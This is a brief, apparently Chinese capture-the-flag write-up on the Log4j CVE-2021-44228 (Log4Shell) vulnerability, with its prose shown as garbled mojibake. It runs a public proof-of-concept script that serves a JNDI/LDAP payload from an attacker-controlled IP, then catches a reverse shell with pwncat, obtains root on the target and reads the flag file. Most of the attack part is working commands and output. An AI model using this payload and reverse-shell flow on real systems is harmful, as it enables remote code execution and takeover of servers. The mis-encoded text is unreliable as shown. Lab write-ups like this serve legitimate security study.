# CVE-2021-44228

:::info

Tags

- Apache Log4j2 lookup JNDI æ³¨å…¥æ¼æ´

å®˜æ–¹æ•°æ®åº“è®°å½•

> Apache Log4j2 2.0-beta9 åˆ° 2.15.0ï¼ˆä¸åŒ…æ‹¬å®‰å…¨ç‰ˆæœ¬ 2.12.2ã€2.12.3 å’Œ 2.3.1ï¼‰é…ç½®ã€æ—¥å¿—æ¶ˆæ¯å’Œå‚æ•°ä¸­ä½¿ç”¨çš„ JNDI åŠŸèƒ½ä¸èƒ½é˜²æ­¢æ”»å‡»è€…æ§åˆ¶çš„ LDAP å’Œå…¶ä»– JNDI ç›¸å…³ç«¯ç‚¹ã€‚ å½“å¯ç”¨æ¶ˆæ¯æŸ¥æ‰¾æ›¿æ¢æ—¶ï¼Œå¯ä»¥æ§åˆ¶æ—¥å¿—æ¶ˆæ¯æˆ–æ—¥å¿—æ¶ˆæ¯å‚æ•°çš„æ”»å‡»è€…å¯ä»¥æ‰§è¡Œä» LDAP æœåŠ¡å™¨åŠ è½½çš„ä»»æ„ä»£ç ã€‚ ä» log4j 2.15.0 å¼€å§‹ï¼Œæ­¤è¡Œä¸ºå·²é»˜è®¤ç¦ç”¨ã€‚ ä»ç‰ˆæœ¬ 2.16.0ï¼ˆä»¥åŠ 2.12.2ã€2.12.3 å’Œ 2.3.1ï¼‰å¼€å§‹ï¼Œæ­¤åŠŸèƒ½å·²è¢«å®Œå…¨åˆ é™¤ã€‚ è¯·æ³¨æ„ï¼Œæ­¤æ¼æ´ç‰¹å®šäº log4j-coreï¼Œä¸ä¼šå½±å“ log4netã€log4cxx æˆ–å…¶ä»– Apache æ—¥å¿—æœåŠ¡é¡¹ç›®ã€‚

:::

ç›´æ¥ä½¿ç”¨ [kozmer/log4j-shell-poc: A Proof-Of-Concept for the CVE-2021-44228 vulnerability.](https://github.com/kozmer/log4j-shell-poc) è¿›è¡Œæ”»å‡»

```shell
root@jmt-projekt:~/log4j-shell-poc# python3 poc.py --userip 139.*.*.* --webport 8080 --lport 9999

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

[+] Exploit java class created success
[+] Setting up LDAP server

[+] Send me: ${jndi:ldap://139.*.*.*:1389/a}
[+] Starting Webserver on port 8080 http://0.0.0.0:8080

Listening on 0.0.0.0:1389
```

ç„¶åå»ºç«‹ä¸€ä¸ªç›‘å¬å™¨ï¼Œå°† `${jndi:ldap://139.*.*.*:1389/a}` ä¼ è¾“åˆ°é¶æœºä¸Šæ‰§è¡Œï¼Œå³å¯æ”¶åˆ°å›è¿çš„ shell

```shell
root@jmt-projekt:~# pwncat-cs -lp 9999
[16:56:09] Welcome to pwncat ğŸˆ!                                                                                                                                                                 __main__.py:164
[16:56:24] received connection from 39.106.20.178:38887                                                                                                                                               bind.py:84
[16:56:26] 0.0.0.0:9999: upgrading from /bin/dash to /bin/bash                                                                                                                                    manager.py:957
[16:56:27] 39.106.20.178:38887: registered new host w/ db                                                                                                                                         manager.py:957
(local) pwncat$ back
(remote) root@engine-2:/usr/local/tomcat# whoami
root
(remote) root@engine-2:/# cat /flag
flag{d23fe301-6f8f-4210-831a-96352d07d4c1}
```
